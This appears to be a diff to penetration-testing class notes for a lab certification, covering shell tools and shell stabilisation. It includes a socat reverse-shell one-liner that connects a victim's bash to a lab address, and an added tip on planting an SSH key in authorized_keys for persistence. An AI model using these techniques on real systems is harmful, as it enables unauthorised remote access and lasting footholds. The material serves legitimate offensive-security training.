@@ -12,14 +12,14 @@ Generate, deliver, and catch shells for initial access or post-exploitation comm
 
 | Tool | Purpose |
 |---|---|
-| `msfvenom` | Payload generation — executables, DLLs, shellcode, web shells |
-| `metasploit` | Framework — stagers, meterpreter listeners, post modules |
-| `netcat` / `ncat` | Listener + raw reverse/bind shells |
-| `pwncat-cs` | Advanced listener — auto TTY upgrade, file transfer |
-| `socat` | Versatile relay — encrypted shells, port forwarding |
-| `impacket-smbserver` | SMB server for file staging to Windows targets |
-| `HoaxShell` | Obfuscated PowerShell reverse shell generator |
-| `revshells.com` | One-click reverse shell syntax for all languages |
+| [[Tools/Payloads & Shells/msfvenom\|msfvenom]] | Payload generation — executables, DLLs, shellcode, web shells |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | Framework — stagers, meterpreter listeners, post modules |
+| [[Tools/Remote Access/Netcat\|netcat]] / `ncat` | Listener + raw reverse/bind shells |
+| [[Tools/Remote Access/pwncat\|pwncat-cs]] | Advanced listener — auto TTY upgrade, file transfer |
+| [[Tools/Remote Access/socat\|socat]] | Versatile relay — encrypted shells, port forwarding |
+| [[Tools/File Transfer/SMBserver\|impacket-smbserver]] | SMB server for file staging to Windows targets |
+| [[Tools/Payloads & Shells/HoaxShell\|HoaxShell]] | Obfuscated PowerShell reverse shell generator |
+| `revshells.com` | One-click reverse shell syntax for all languages (website) |
 
 ---
 
@@ -251,6 +251,8 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 # Victim
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444
 ```
+
+> [!tip] **Even better than a stabilized TTY: drop an SSH key.** A reverse shell — even a fully upgraded one — still dies when the connection drops. If the box runs SSH (22) and you can write a user's home, append your public key to their `~/.ssh/authorized_keys` and log back in over SSH: a stable, fully-interactive session with no password (public-key auth ignores the account password entirely), and free persistence. Do this the moment the shell is stable. Full steps: [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc#Stabilize First — Drop an SSH Key (no password needed)|Linux Priv Esc → Drop an SSH Key]].
 
 ---
 
